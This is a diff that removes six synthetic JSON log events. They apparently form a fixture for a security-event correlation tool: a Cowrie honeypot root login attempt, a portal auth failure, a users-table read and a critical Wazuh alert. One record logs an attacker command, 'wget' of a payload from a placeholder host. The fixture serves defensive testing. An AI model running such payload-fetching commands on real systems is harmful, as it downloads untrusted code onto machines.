@@ -1,6 +1,0 @@
-{"event_id":"c1","session_id":"demo-session","timestamp":"2026-01-01T10:00:00Z","source":"cowrie","event_type":"login_attempt","username":"root"}
-{"event_id":"c2","session_id":"demo-session","timestamp":"2026-01-01T10:00:03Z","source":"cowrie","event_type":"login_failure","status":"failed","username":"root"}
-{"event_id":"c3","session_id":"demo-session","timestamp":"2026-01-01T10:00:08Z","source":"cowrie","event_type":"command","command":"wget http://example.invalid/payload","bytes_out":120}
-{"event_id":"p1","session_id":"demo-session","timestamp":"2026-01-01T10:00:10Z","source":"portal","event_type":"portal_auth_failure","status":"failed","resource":"login"}
-{"event_id":"d1","session_id":"demo-session","timestamp":"2026-01-01T10:00:12Z","source":"database","event_type":"db_read","resource":"users"}
-{"event_id":"w1","session_id":"demo-session","timestamp":"2026-01-01T10:00:15Z","source":"wazuh","event_type":"alert","severity":"critical","resource":"endpoint-1"}
